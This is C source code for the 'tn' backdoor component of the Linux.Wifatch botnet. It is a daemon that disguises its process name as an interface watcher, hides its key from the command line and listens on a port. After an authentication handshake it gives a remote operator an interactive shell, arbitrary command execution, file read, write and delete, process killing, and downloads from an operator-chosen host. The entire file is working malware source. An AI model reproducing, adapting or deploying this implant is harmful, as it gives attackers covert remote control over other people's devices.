
/*
 * This file is part of Linux.Wifatch
 *
 * Copyright (c) 2013,2014,2015 The White Team <rav7teif@ya.ru>
 *
 * Linux.Wifatch is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Linux.Wifatch is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Linux.Wifatch. If not, see <http://www.gnu.org/licenses/>.
 */

// usage: tn port id64.key64 -- primitive telnet server

// 1 -- start shell
// 2 path -- open rdonly
// 3 path -- open wrcreat
// 4 -- close
// 5 signal8 x16 pid32 -- kill
// 6 x8 mod16 path -- chmod
// 7 srcpath | dstpath -- rename
// 8 path -- unlink
// 9 path -- mkdir
// 10 x8 port16be saddr32be | writedata* | "" | dstpatha - len32* -- download // need to use readlink or so
// 11 path - statdata -- lstat
// 12 path - statdata -- statfs
// 13 command -- exec command (stdin/out/err null)
// 14 command - cmdoutput... "chg_id" -- exec commmand  with end marker
// 15 - dirdata* | "" -- getdents64
// 16 x16 mode8 off32 --  lseek
// 17 - fnv32a -- fnv32a
// 18 - filedata* | "" -- readall file
// 19 filedate -- write file
// 20 path - linkdata -- readlink
// 21 - ret32 -- last syscall result

// ver7
// 22 path - chdir

// ver 8
// 23 path - statdata -- stat

#define VERSION "8"

#include <errno.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <inttypes.h>
#include <sys/statfs.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <inttypes.h>
#include <signal.h>
#include <string.h>
#include <time.h>
#include <fcntl.h>

#include <sys/syscall.h>

#include "tinyutil.h"

#if 1
# define crypto_hash_BYTES 1088/8
# include "keccak/Keccak-compact.c"
#else
# include "sha3/sha3.c"
#endif

extern char **environ;

// eXit
__attribute__ ((noreturn))
static void x(void)
{
        _exit(0);
}

static const struct sigaction sa_sigign = {
        .sa_handler = SIG_IGN,
        .sa_flags = SA_RESTART,
};

static const struct sigaction sa_sigdfl = {
        .sa_handler = SIG_DFL,
        .sa_flags = SA_RESTART,
};

static uint8_t secret[32 + 32 + 32];    // challenge + id + secret

// HexDump, for test only
static void hd(unsigned char *buf, int l)
{
        const char hd[16] = "0123456789abcdef";

        int i;

        for (i = 0; i < l; ++i) {
                write(2, hd + (buf[i] >> 4), 1);
                write(2, hd + (buf[i] & 15), 1);
        }

        write(2, "\n", 1);
}

static int rpkt(int offset)
{
        uint8_t *base = buffer + offset;
        uint8_t *p = base;
        uint8_t l;

        if (read(0, &l, 1) <= 0 || (l && l != recv(0, base, l, MSG_WAITALL)))
                x();

        base[l] = 0;
        return l;
}

static void wpkt(uint8_t * base, uint8_t len)
{
        write(1, &len, 1);
        write(1, base, len);
}

static void sockopts(int fd)
{
        static const int one = 1;

        setsockopt(fd, SOL_SOCKET, SO_KEEPALIVE, &one, sizeof (one));
        setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof (one));
}

static uint32_t wget(int fh)
{
        int fd = socket(AF_INET, SOCK_STREAM, 0);

        if (fd < 0)
                return 1;

        struct sockaddr_in sa;

        sa.sin_family = AF_INET;
        sa.sin_addr.s_addr = *(uint32_t *) (buffer + 4);
        sa.sin_port = *(uint16_t *) (buffer + 2);;

        sockopts(fd);

        if (connect(fd, (struct sockaddr *)&sa, sizeof (sa)))
                return 2;

        int wlen;

        while ((wlen = rpkt(0)))
                write(fd, buffer, wlen);

        for (;;) {
                int len = recv(fd, buffer, 32768, MSG_WAITALL);

                if (len <= 0)
                        break;

                write(fh, buffer, len);
                wpkt((uint8_t *) & len, sizeof (len));
        }

        close(fd);

        return 0;
}

static void setfds(int fd)
{
        int i;

        for (i = 0; i < 3; ++i)
                syscall(SCN(SYS_dup2), fd, i);

        close(fd);
}

int main(int argc, char *argv[])
{
#if 0
        {
                crypto_hash(buffer, buffer, 96);
                hd(buffer, 1088 / 8);
        }
#endif
        if (argc == 2) {
                static char *eargv[] = { "/sbin/ifwatch-if", "eth0", 0, 0 };
                eargv[2] = argv[1];
                execve(argv[0], eargv, environ);
        }

        {
                int i;

                for (i = 0; i < 64 + 2; ++i)
                        secret[32 + i] = argv[2][i * 2 + 0] * 16 + argv[2][i * 2 + 1] - 'a' * (16 + 1);

                for (i = 0; i < (64 + 2) * 2; ++i)
                        argv[2][i] = ' ';
        }

        int ls = socket(AF_INET, SOCK_STREAM, 0);

        if (ls < 0)
                return 0;

        struct sockaddr_in sa;

        sa.sin_family = AF_INET;
        sa.sin_addr.s_addr = INADDR_ANY;
        sa.sin_port = *(uint16_t *) (secret + 32 + 64);

        sockopts(0);

        if (bind(ls, (struct sockaddr *)&sa, sizeof (sa)))
                return 0;

        if (listen(ls, 1))
                return 0;

        write(1, MSG("ZohHoo5i"));

        if (fork())
                return 0;

        sigaction(SIGHUP, &sa_sigign, 0);
        sigaction(SIGCHLD, &sa_sigign, 0);

        syscall(SCN(SYS_setsid));

        for (;;) {
                {
                        int i = open("/dev/urandom", O_RDONLY);

                        if (i >= 0) {
                                read(i, secret, 32);
                                close(i);
                        }

                        ++secret[0];

                        for (i = 0; i < 31; ++i)
                                secret[i + 1] += secret[i];
                }

                int fd = accept(ls, 0, 0);

                if (fd >= 0) {
                        if (fork() == 0) {
                                close(ls);
                                syscall(SCN(SYS_setsid));
                                sigaction(SIGCHLD, &sa_sigdfl, 0);

                                setfds(fd);

                                sockopts(0);

                                write(0, secret, 32 + 32);
                                crypto_hash(buffer, secret, 32 + 32 + 32);

                                rpkt(32);

                                if (memcmp(buffer, buffer + 32, 32))
                                        x();

                                wpkt(MSG(VERSION "/" arch));    /* version/arch */
                                static const uint32_t endian = 0x11223344;

                                wpkt((uint8_t *) & endian, sizeof (endian));
                                wpkt(buffer, 0);

                                uint8_t clen;
                                int fh = -1;
                                int ret;

                                while ((clen = rpkt(0)))
                                        switch (buffer[0]) {
                                          case 1:      // telnet
                                                  {
                                                          static char *argv[] = { "sh", "-i", 0 };
                                                          execve("/bin/sh", argv, environ);
                                                  }
                                                  break;

                                          case 2:      // open readonly
                                          case 3:      // open wrcreat
                                                  ret = fh = open(buffer + 1, buffer[0] == 2 ? O_RDONLY : O_RDWR | O_CREAT, 0600);
                                                  break;

                                          case 4:      // close
                                                  close(fh);
                                                  break;

                                          case 5:      // kill
                                                  ret = syscall(SCN(SYS_kill), *(uint32_t *) (buffer + 4), buffer[1]);
                                                  break;

                                          case 6:      // chmod
                                                  ret = syscall(SCN(SYS_chmod), buffer + 4, *(uint16_t *) (buffer + 2));
                                                  break;

                                          case 7:      // rename
                                                  rpkt(260);
                                                  ret = syscall(SCN(SYS_rename), buffer + 1, buffer + 260);
                                                  break;

                                          case 8:      // unlink
                                                  ret = syscall(SCN(SYS_unlink), buffer + 1);
                                                  break;

                                          case 9:      // mkdir
                                                  ret = syscall(SCN(SYS_mkdir), buffer + 1, 0700);
                                                  break;

                                          case 10:     // wget
                                                  ret = wget(fh);
                                                  break;

                                          case 11:     // lstat
                                          case 23:     // stat
                                                  {
                                                          struct stat buf;
                                                          int l = (buffer[0] == 23 ? stat : lstat) (buffer + 1, &buf);

                                                          ((uint32_t *) buffer)[0] = buf.st_dev;
                                                          ((uint32_t *) buffer)[1] = buf.st_ino;
                                                          ((uint32_t *) buffer)[2] = buf.st_mode;
                                                          ((uint32_t *) buffer)[3] = buf.st_size;
                                                          ((uint32_t *) buffer)[4] = buf.st_mtime;

                                                          wpkt(buffer, l ? 0 : sizeof (uint32_t) * 5);
                                                  }
                                                  break;

                                          case 12:
                                                  {
                                                          struct statfs sfsbuf;
                                                          int l = statfs(buffer + 1, &sfsbuf);

                                                          ((uint32_t *) buffer)[0] = sfsbuf.f_type;
                                                          ((uint32_t *) buffer)[1] = sfsbuf.f_bsize;
                                                          ((uint32_t *) buffer)[2] = sfsbuf.f_blocks;
                                                          ((uint32_t *) buffer)[3] = sfsbuf.f_bfree;
                                                          ((uint32_t *) buffer)[4] = sfsbuf.f_bavail;
                                                          ((uint32_t *) buffer)[5] = sfsbuf.f_files;
                                                          ((uint32_t *) buffer)[6] = sfsbuf.f_ffree;

                                                          wpkt(buffer, l ? 0 : sizeof (uint32_t) * 7);
                                                  }
                                                  break;

                                          case 13:     // exec quiet
                                          case 14:     // exec till marker
                                                  {
                                                          int quiet = buffer[0] == 13;

                                                          pid_t pid = fork();

                                                          if (pid == 0) {
                                                                  if (quiet)
                                                                          setfds(open("/dev/null", O_RDWR));

                                                                  static char *argv[] = { "sh", "-c", buffer + 1, 0 };
                                                                  execve("/bin/sh", argv, environ);
                                                                  _exit(0);
                                                          }

                                                          if (pid > 0)
                                                                  syscall(SCN(SYS_waitpid), (int)pid, &ret, 0);

                                                          if (!quiet)
                                                                  wpkt(secret, 32 + 32);        // challenge + id
                                                  }
                                                  break;

                                          case 15:     // readdir
                                                  {
                                                          int l;

                                                          while ((l = syscall(SCN(SYS_getdents64), fh, buffer, sizeof (buffer))) > 0) {
                                                                  uint8_t *buf = buffer;

                                                                  do {
                                                                          int w = l > 254 ? 254 : l;

                                                                          wpkt(buf, w);
                                                                          buf += w;
                                                                          l -= w;
                                                                  }
                                                                  while (l);
                                                          }

                                                          wpkt(buffer, 0);
                                                  }
                                                  break;

                                          case 16:     // lseek
                                                  ret = lseek(fh, *(int32_t *) (buffer + 4), buffer[3]);
                                                  break;

                                          case 17:     // fnv
                                          case 18:     // readall
                                                  {
                                                          int fnv = buffer[0] == 17;
                                                          uint32_t hval = 2166136261U;
                                                          int l;

                                                          while ((l = read(fh, buffer, 254)) > 0) {
                                                                  if (fnv) {
                                                                          uint8_t *p = buffer;

                                                                          while (l--) {
                                                                                  hval ^= *p++;
                                                                                  hval *= 16777619;
                                                                          }
                                                                  } else
                                                                          wpkt(buffer, l);
                                                          }

                                                          wpkt((uint8_t *) & hval, fnv ? sizeof (hval) : 0);
                                                  }
                                                  break;

                                          case 19:     // write
                                                  ret = write(fh, buffer + 1, clen - 1);
                                                  break;

                                          case 20:     // readlink
                                                  {
                                                          int l = syscall(SCN(SYS_readlink), buffer + 1, buffer + 260, 255);

                                                          wpkt(buffer + 260, l > 0 ? l : 0);
                                                  }
                                                  break;

                                          case 21:     // readret
                                                  wpkt((uint8_t *) & ret, sizeof (ret));
                                                  break;

                                          case 22:     // chdir
                                                  ret = syscall(SCN(SYS_chdir), buffer + 1);
                                                  break;

                                          default:
                                                  x();
                                        }
                        }
                        // keep fd open for at least delay, also delay hack attempts
                        static const struct timespec ts = { 1, 0 };
                        syscall(SCN(SYS_nanosleep), &ts, 0);

                        close(fd);
                }
        }
}
